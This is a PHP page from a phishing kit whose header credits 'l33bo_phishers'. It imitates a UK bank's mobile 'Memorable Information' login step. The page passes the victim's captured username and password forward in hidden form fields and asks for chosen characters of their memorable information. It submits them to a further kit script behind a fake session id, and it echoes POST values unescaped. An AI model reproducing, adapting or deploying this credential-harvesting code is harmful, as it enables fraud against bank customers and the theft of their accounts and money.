<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
require_once("../assets/includes/memo.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Enter Memorable</title>


<meta http-equiv="content-language" content="en-gb">
<link rel="alternate" media="handheld" href="">
<meta name="viewport" content="width=device-width">
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/icon"> 
<link rel="icon" href="assets/img/favicon.ico" type="image/icon">
<link rel="apple-touch-icon" sizes="57x57" href="assets/img/57x57.jpg">
<link rel="apple-touch-icon" sizes="114x114" href="assets/img/114x114.jpg">
<link type="text/css" href="assets/css/mobile.css" rel="stylesheet">
<style>
.error_strings {
    margin: 0px;
    padding: 0px 20px 0px 30px;
    color: #db0000;
    font-size: 16px;
}
</style>
</head>
<body class="hasJS">
    
    
    <div id="outer">
        <div id="banner">
            
            <p id="logo">
                <img src="assets/img/official.gif">
            </p>
            
            
            <p id="userstatusNGB">
                <img src="assets/img/lock.png">
            </p>
            
            
            
            <p class="cookiePolicy">
                
                <a id="lnkePrivacy" name="lnkePrivacy" href="#">Cookie policy </a>
            </p>
            
            <div class="clearer"></div>
        </div>
        <div id="header">
            <div class="panelTL">
                <div class="panelTR">
                    <div class="panelBR">
                        <div class="panelBL">
                            <div id="headerInner">
                                
      


<h1>Memorable Information</h1>



<!-- end TS:component_0_free_format -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="content">
            <div class="login">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
  <div class="panelInner"><div class="inner">
<p class="sudoLabel">Please select characters below.</p>
<form id="frmEnterMemorableInformation1" name="frmEnterMemorableInformation1" method="post" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="username" value="<?=$_POST['user']?>">
<input type="hidden" name="password" value="<?=$_POST['pass']?>">
<div class="memorableInfo">
<div class="formField" style="margin-right: 8px;">
<div class="formField" style="margin-right: 8px;">
<label for="frmEnterMemorableInformation1:formMem1">1st:</label>
<select id="frmEnterMemorableInformation1:formMem1" name="frmEnterMemorableInformation1:formMem1" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="formField" style="margin-right: 8px;">
<div class="formField" style="margin-right: 8px;">
<label for="frmEnterMemorableInformation1:formMem2">4th:</label>
<select id="frmEnterMemorableInformation1:formMem2" name="frmEnterMemorableInformation1:formMem2" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="formField" style="margin-right: 8px;">
<div class="formField" style="margin-right: 8px;">
<label for="frmEnterMemorableInformation1:formMem3">6th:</label>
<select id="frmEnterMemorableInformation1:formMem3" name="frmEnterMemorableInformation1:formMem3" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="clearer"></div>
</div>
<div class="divider">
<hr>
</div>
<div class="actions">
<input id="frmEnterMemorableInformation1:lnkSubmit" name="frmEnterMemorableInformation1:lnkSubmit" type="submit" value="Submit" title="Submit" class="submitAction">
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev2PCancel"><a id="frmEnterMemorableInformation1:lnkCancel" name="frmEnterMemorableInformation1:lnkCancel" href="#" class="blockLink">Cancel</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
</div>
</div>
 </div>
</div>
</div>
 </div>

            

          
      
            
            

            <div id="footerLogin">
                <div class="FootNav">    
                    <div class="lnkLevFoot">
                        <p class="lnkLevFootP">
                            
                            <a id="lnk2" name="lnk2" href="#" class="blockLink"> Help
                            </a>
                        </p>
                    </div>
                    <div class="lnkLevFoot">
                        
                        <p class="lnkLevFootP">
                            <a id="lnk3" name="lnk3" href="#" class="blockLink"> Security
                            </a>
                        </p>
                    </div>
                    <div class="lnkLevFoot">
                        <p class="lnkLevFootP">
                            
                            <a id="lnk4" name="lnk4" href="#" class="blockLink"> Contact us
                            </a>
                        </p>
                    </div>
                </div>
            </div>
            <div class="aside">
                <p class="sideNote">
                    
                    <a id="lnkBookmark" name="lnkBookmark" href="#">Find out how to bookmark this screen
                    </a>
                </p>
                
                
            </div>
            <div class="appBannerBG">
                <div class="appBannerLink"><p><a href="#"><img alt="fscs tile" src="assets/img/ad2.jpg"></a></p>
                </div>
            </div>
            <div class="clearer"></div>
            <div>
                

                <div class="footerLinksLogin">
                    
                    <a id="unauth:lnksecurity" name="unauth:lnksecurity" href="#">Security
                    </a> 
                    
                    <a id="unauth:lnkLegal" class="footerLinksLast" name="unauth:lnkLegal" href="#">Legal
                    </a>
                </div>
            </div>
        </div>
    </div>

    







<script type="text/javascript" src="assets/js/global_2.js"></script>

	

    


</body>
</html>